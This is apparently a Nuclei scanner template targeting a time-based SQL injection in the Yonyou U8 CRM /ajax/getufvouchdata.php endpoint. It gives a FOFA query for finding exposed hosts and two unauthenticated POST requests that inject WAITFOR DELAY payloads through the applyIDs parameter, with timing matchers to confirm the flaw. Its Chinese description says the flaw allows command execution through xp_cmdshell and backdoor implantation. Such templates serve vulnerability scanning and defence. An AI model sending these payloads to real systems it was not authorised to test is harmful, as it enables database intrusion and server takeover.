id: yongyouU8-CRM-getufvouchdata_php-sql-time

info:
  name: "用友U8 CRM系统ajax 组件SQL注入漏洞"
  author: Unknown
  severity: high
  description: |-
    fofa: title="用友U8CRM"
      用友U8 CRM客户关系管理系统中/ajax/getufvouchdata.php接口存在SQL注入缺陷。攻击者可利用该缺陷构造恶意SQL语句，通过调用xpcmdshell扩展存储过程实现系统命令执行，进而写入持久化后门文件并获取目标服务器控制权限。该漏洞允许未经身份验证的远程攻击者突破应用层安全防护，直接对后端数据库及操作系统实施攻击。
  reference:
  - https://mp.weixin.qq.com/s/LT1pxAcTL4jzmGGwekHcVg?token=974751616&lang=zh_CN
  tags: 用友


http:
- raw:
  - |
    POST /ajax/getufvouchdata.php?DontCheckLogin=1&Action=checkDispatchListDetails HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
    Cookie: PHPSESSID=bgsesstimeout-;
    Content-Type: application/x-www-form-urlencoded; charset=utf-8

    applyIDs=1);WAITFOR+DELAY+'0:0:4'--
  - |
    POST /ajax/getufvouchdata.php?DontCheckLogin=1&Action=checkDispatchListDetails HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
    Cookie: PHPSESSID=bgsesstimeout-;
    Content-Type: application/x-www-form-urlencoded; charset=utf-8

    applyIDs=1);WAITFOR+DELAY+'0:0:8'--
  matchers:
  - type: dsl
    dsl:
    - 'duration_1>=4 && duration_1<=5'
    - 'duration_2>=8 && duration_2<=9'
    condition: and
